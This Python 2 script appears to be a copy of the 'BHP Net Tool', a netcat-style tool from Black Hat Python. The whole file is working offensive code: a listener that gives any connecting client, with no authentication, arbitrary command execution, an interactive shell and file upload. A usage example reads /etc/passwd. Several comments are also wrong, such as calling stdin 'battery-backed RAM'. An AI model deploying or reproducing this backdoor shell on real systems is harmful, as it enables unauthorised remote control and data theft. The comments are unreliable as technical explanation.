# /usr/local/bin/python2.7
# coding: utf8
import sys
import socket
import getopt
import threading
import subprocess

# define some global variable
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0


# this is the function to display detail massage of how to use this python2 script
def usage():
    print "BHP Net Tool"
    print
    print "Usage: bhpnet.py -t target_host -p port"
    print '-l --listen -listen on[host]:[port] for incoming a connection'
    print '-e --execute=file_to_run -execute the given file upon receiving a connection'
    print '-c --command -initialize a command shell'
    print '-u --upload=destination -upon receiving connection upload a file and write to [destination]'
    print
    print
    print 'Examples'
    print 'bhpnet.py -t 192.168.0.1 -p 55 -l -c'
    print 'bhpnet.py -t 192.168.0.1 -p 55 -l -u=c:\\target.exe'
    print 'bhpnet.py -t 192.168.0.1 -p 55 -l -e="cat /etc/passwd"'
    print 'echo "ABCDEFGHI" | ./bhpnet/py -t 192.168.11.12 -p 135'
    sys.exit(0)


# this is the function of main in this script
def main():
    # global is a string to use global variable
    global listen
    global port
    global execute
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()
    # read terminal choose
    try:
        # 使用sys.argv[1:]过滤掉第一个参数（它是执行脚本的名字，不应算作参数的一部分
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
                                   ["help", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print str(err)
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "unhandled Option"

    # listen or standard send/post data
    if not listen and len(target) and port > 0:
        # read battery-backed RAM from terminal
        # note: when you don't input data sys send CTRL+D
        # (a command looks like CTRL+C,however it's lighter,
        #  for example: when we change user from root to other user, sys use Ctrl+D to active it )
        buffer = sys.stdin.read()
        # send data
        client_sender(buffer)
    # begain to listen and upload files and use commands
    # make a rebound shell
    # based on the command that you choose in the terminal
    if listen:
        server_loop()



# this is the function to connect without listen (only send/post data)
def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((target, port))
        if len(buffer):
            client.send(buffer)

        while True:
            # wait data return
            recv_len = 1
            response = ""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break
            print response,

            # wait for input more
            buffer = raw_input("")
            buffer += "\n"

            # send it
            client.send(buffer)
    except:
        print "[*] Exception ! exiting."
    # close connect
    client.close()


def server_loop():
    global target
    # if you don't define the target we'll listen all
    if not len(target):
        target = "0.0.0.0"
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))

    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        # 分拆一个线程去处理新的客户端
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()


def run_command(command):
    # change line
    command = command.rstrip()
    # run command and return output
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)

    except:
        output = "Failed to execute command.\r\n"
    return output


# achieve upload file
def client_handler(client_socket):
    global upload
    global execute
    global command

    # check upload file
    if len(upload_destination):
        # read all char and write
        file_buffer = ''

        # read data until no data is suit
        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data
        # accept those data and print them

        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            # make sure file is write out
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Faild to sava file to %s\r\n" % upload_destination)

    # check command
    if len(execute):
        output = run_command(execute)
        client_socket.send(output)
    # if need an command shell
    if command:
        while True:
            # create a window
            client_socket.send("<BHP:#>")

            cmd_buffer = ''
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
            # return command output
            response = run_command(cmd_buffer)
            # return response data
            client_socket.send(response)
main()